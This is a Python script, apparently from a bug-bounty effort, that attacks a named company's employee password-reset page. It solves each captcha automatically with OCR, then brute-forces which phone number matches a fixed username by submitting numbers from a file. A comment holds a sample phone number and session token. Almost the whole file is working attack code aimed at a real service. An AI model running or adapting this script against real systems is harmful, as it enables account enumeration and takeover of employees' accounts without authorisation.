# {"code":400,"message":"\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e","data":[]}
# {"code":400,"message":"验证码不正确","data":[]}
# {"code":400,"message":"\u624b\u673a\u53f7\u7801\u4e0d\u6b63\u786e\uff0c\u5982\u6709\u7591\u95ee\u8bf7\u8054\u7cfbHRBP\u4fee\u6539","data":[]}
# {"code":400,"message":"手机号码不正确，如有疑问请联系HRBP修改","data":[]}
from verifyCaptcha import get_local_captcha
from uuid import uuid4
import requests
import os
from Log import create_logger
import sys
sys.path.append(r'../burpCaptcha')

img_save = '../imgs/guazi/'
try:
    os.makedirs(img_save)
except Exception as e:
    pass

logger = create_logger('./PhoneLog.txt')


url = r'https://ams.guazi.com/pwd/reset'
session = requests.Session()
cookies = session.get(url).cookies
for each_cookie in cookies:
    if each_cookie.name == 'XSRF-TOKEN':
        XSRF_TOKEN = each_cookie.value

def run(phone):
    # 保存的验证码图片路径
    img_name = str(uuid4())[:5]
    img_file = r'{}\{}.png'.format(img_save, img_name)

    # 获取验证码
    captcha_url = r'https://ams.guazi.com/api/password/captcha'
    res2 = session.get(url=captcha_url)
    img_content = res2.content

    # 保存验证码
    with open(img_file, 'ab') as f:
        f.write(img_content)

    # 识别验证码
    balance, captcha = get_local_captcha(img_file)
    logger.info('[{}] -> [{}] [{}]'.format(balance, img_file, captcha))

    # 提交登陆
    # username=zhangxia&captcha=v9rm&phone=15203143181&_token=Vtr2FdOSXOXavA6uUlVCOIjwZjKcnTdPsyW5y4Bj
    valid_url = r'https://ams.guazi.com/api/password/verifyAccount'
    data = {'username': 'wangfei', 'phone': phone, 'captcha': captcha, '_token': XSRF_TOKEN}
    res4_text = session.post(valid_url, data).text
    result = '[{} : {}] -> [{}]'.format('wangfei', phone, res4_text)
    logger.info(result)
    if r'\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e' in res4_text:
        run(phone)




with open(r'H:\5. 资料\1. 挖洞报告\SRC\瓜子\wangfei_phone.txt', 'rt') as f:
    for each in f.readlines():
        phone = each.strip()
        run(phone)